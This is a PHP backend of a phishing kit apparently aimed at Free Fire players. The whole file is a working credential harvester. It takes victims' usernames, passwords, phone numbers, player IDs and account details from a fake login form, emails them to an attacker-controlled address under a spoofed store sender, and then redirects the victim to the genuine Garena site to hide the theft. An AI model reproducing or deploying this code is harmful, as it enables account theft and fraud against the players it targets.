<?php
$username = $_POST['username'];
$password = $_POST['password'];
$nope = $_POST['nope'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$platform = $_POST['platform'];

$subjek = "($login) $tier | LV $level |ID $playid | $nope";
$body = '
<center> 
<div style="background: url(https://i.ibb.co/1TfpjdY/20210906-042433.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Forwaned message</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email/Phone/Username</th>
  <th style="width:78%;text-align: center;"><b>'.$username.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>'.$password.'</th> 
 </tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Level</th>
  <th style="width:78%;text-align: center;"><b>'.$level.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>ID Player</th>
  <th style="width:78%;text-align: center;"><b>'.$playid.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Tier Rank</th>
  <th style="width:78%;text-align: center;"><b>'.$tier.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Elite Pass</th>
  <th style="width:78%;text-align: center;"><b>'.$rpt.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Login</th>
  <th style="width:78%;text-align: center;"><b>'.$login.'</th> 
 </tr>
 <tr>
<th style="width:22%;text-align:left;" height="25px"><b>Nomer ponsel</th>
  <th style="width:78%;text-align: center;"><b>'.$nope.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>PlatForm</th>
  <th style="width:78%;text-align: center;"><b>'.$platform.'</th> 
 </tr>
 </table>
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3"><b>Daichi KT</b></font>
</div>
</center>
';
include'email.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: STOK DEDEN STORE <support@ikt.my.id>' . "\r\n";
$kirim = mail($daichimedia, $subjek, $body, $headers);

echo "<script type='text/javascript'>window.top.location='https://ff.garena.com/';</script>";
?>